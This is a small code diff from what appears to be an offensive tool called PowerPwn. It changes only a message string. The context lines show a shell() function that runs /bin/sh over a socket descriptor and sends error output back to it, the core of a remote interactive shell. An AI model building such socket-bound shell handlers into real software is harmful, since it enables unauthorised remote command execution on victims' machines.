@@ -61,7 +61,7 @@ void help(void) {
 void shell() {
     std::string shell = "\x1b[31m(PowerPwn: Shell) > ";
     std::string exe = "\x1b[32mExecuting /bin/sh\n";
-    std::string exits = "Type exit to return to LinPwn.\n";
+    std::string exits = "Type exit to return to PowerPwn.\n";
     char option[BUFFER];
     const char *errors = " 2>&0";
     write(sd(), exe.data(), exe.length());
